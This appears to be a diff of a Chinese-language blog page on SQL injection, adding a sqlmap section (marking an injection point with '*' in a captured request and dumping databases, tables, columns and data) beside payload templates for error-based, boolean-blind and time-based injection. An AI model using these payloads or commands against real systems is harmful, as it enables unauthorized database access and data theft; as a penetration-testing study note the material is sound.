@@ -458,14 +458,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    586
+                    695
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    3 分
                 </div>
                 
 
@@ -532,6 +532,14 @@ union select 1 from (select count(*),concat((playload limit 0,1) ,&quot; &quot;,
 and ascii(substr((playload),n,1))&gt;n     //ascii判断
 </code></pre>
 <h4 id="7、时间盲注"><a href="#7、时间盲注" class="headerlink" title="7、时间盲注"></a>7、时间盲注</h4><pre><code>and if((playload),sleep(n),0)
+</code></pre>
+<h4 id="8、sqlmap"><a href="#8、sqlmap" class="headerlink" title="8、sqlmap"></a>8、sqlmap</h4><p>一般将数据包复制下来，将注入点用<code>*</code>标识</p>
+<p><code>GET /api/v4.php?id=1*&amp;page=1&amp;limit=10 HTTP/1.1</code></p>
+<pre><code>python sqlmap.py -r 文件路径 --dbs   //数据库名
+python sqlmap.py -r 文件路径 -D 数据库名 --tables  //表名
+python sqlmap.py -r 文件路径 -D 数据库名 -T 表名 --columns//列名
+python sqlmap.py -r 文件路径 -D 数据库名 -T 表名 --dump &quot;列名&quot;
+//获取字段内容
 </code></pre>
 
                 
@@ -938,7 +946,7 @@ and ascii(substr((playload),n,1))&gt;n     //ascii判断
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">22.8k</span>
+                        class="white-color">22.9k</span>
             
             
             
